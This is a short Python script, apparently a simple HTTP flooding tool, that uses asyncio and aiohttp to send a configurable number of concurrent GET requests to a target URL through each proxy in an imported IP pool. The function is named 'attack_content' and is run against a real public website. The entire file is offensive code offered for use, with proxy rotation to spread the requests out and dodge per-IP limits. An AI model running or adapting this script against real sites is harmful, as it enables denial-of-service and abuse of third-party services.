import asyncio
import aiohttp
from 已完成.attack.build_ip_pool import available_ip_pool

def attack_content(final_url,final_count):
    print()

    async def single_one(attack_url,one_proxy):
        async with aiohttp.ClientSession() as session:
            async with session.get(attack_url,proxy=one_proxy) as response:
                try:
                    bb = await response.read()
                    cc = await response.text()
                    print('{}{}'.format(bb,cc))
                except Exception as e:
                    print('await error:{}'.format(e))


    def normal_formula(the_count):
        for each_proxy in available_ip_pool:
            async def main(attack_net):
                #######proxy_here......#########
                proxy = 'http://{}'.format(each_proxy)
                #######proxy_here......#########
                await single_one(attack_url=attack_net, one_proxy=proxy)

            loop = asyncio.get_event_loop()

            tasks = [asyncio.ensure_future(main(attack_net=final_url)) for _ in range(the_count)]
            loop.run_until_complete(asyncio.wait(tasks))


    normal_formula(the_count=final_count)  #input number...

attack_content(final_url='https://www.baidu.com/',final_count=3)
